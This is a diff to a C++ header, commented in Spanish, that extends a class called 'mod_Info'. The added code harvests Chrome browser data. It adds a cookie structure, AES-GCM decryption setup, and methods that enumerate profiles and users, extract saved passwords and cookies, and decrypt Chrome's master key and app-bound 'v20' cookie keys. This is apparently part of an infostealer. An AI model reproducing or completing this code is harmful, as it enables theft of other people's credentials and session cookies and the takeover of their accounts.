@@ -32,23 +32,74 @@ struct Chrome_Profile {
 	std::string strHostedDomain;
 };
 
+//cookies: creation_utc, host_key, name, encrypted_value, path, expires_utc, last_access_utc, last_update_utc
+struct Cookie {
+	std::string strCreationUTC;
+	std::string strHostKey;
+	std::string strName;
+	std::string strValue;
+	std::string strPath;
+	std::string strExpiresUTC;
+	std::string strLastAccessUTC;
+	std::string strLastUpdateUTC;
+};
+
 class mod_Info {	
 	public:
 		//Probar para mostrar toda la info
 		void test_Data();
 
+		mod_Info() {
+			NTSTATUS nStatus = 0;
+
+			nStatus = BCryptOpenAlgorithmProvider(&this->hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
+			if (!BCRYPT_SUCCESS(nStatus)) {
+				__DBG_("BCryptOpenAlgorithmProvider error");
+				__DBG_(nStatus);
+				return;
+			}
+
+			nStatus = BCryptSetProperty(this->hAlgorithm, BCRYPT_CHAINING_MODE, (UCHAR*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
+			if (!BCRYPT_SUCCESS(nStatus)) {
+				__DBG_("BCryptSetProperty error");
+				__DBG_(nStatus);
+				BCryptCloseAlgorithmProvider(this->hAlgorithm, 0);
+				return;
+			}
+		}
+
+		~mod_Info() {
+			if (this->hAlgorithm) {
+				BCryptCloseAlgorithmProvider(this->hAlgorithm, 0);
+			}
+		}
+
 	private:
+		BCRYPT_ALG_HANDLE hAlgorithm = 0;
+		BCRYPT_KEY_HANDLE hKey = 0;
+		BCRYPT_KEY_HANDLE hKey2 = 0;
+
+		//Primero llamar a esta funcion la cual obtiene los perfiles y la llave maestra
 		std::vector<Chrome_Profile> m_ChromeProfiles();
 		std::vector<Chrome_Login_Data> m_ProfilePasswords(const std::string& strUserPath);
+		std::vector<Cookie> m_ProfileCookies(const std::string& strUserPath, const std::string& name);
 
 		std::vector<std::string> m_Usuarios();
 
+		//Descifrar llave maestra y datos cifrados
 		std::string m_DecryptMasterKey(const std::string& strPass);
-		std::string m_DecryptLogin(const std::string& strPass);
+		std::string m_DecryptData(const std::string& strPass);
 
+		//Vector que aloja llave maestra
 		std::vector<unsigned char> vcChromeKey;
+		std::vector<unsigned char> vcBoundKey; //para desencriptar v20 cookies
+
+		//Vector que aloja informacion de perfiles
+		std::vector<Chrome_Profile> vcChromeProfiles;
 
 		std::string strBasePath = "";
+
+		bool isBcrptOK = false;
 
 };
 
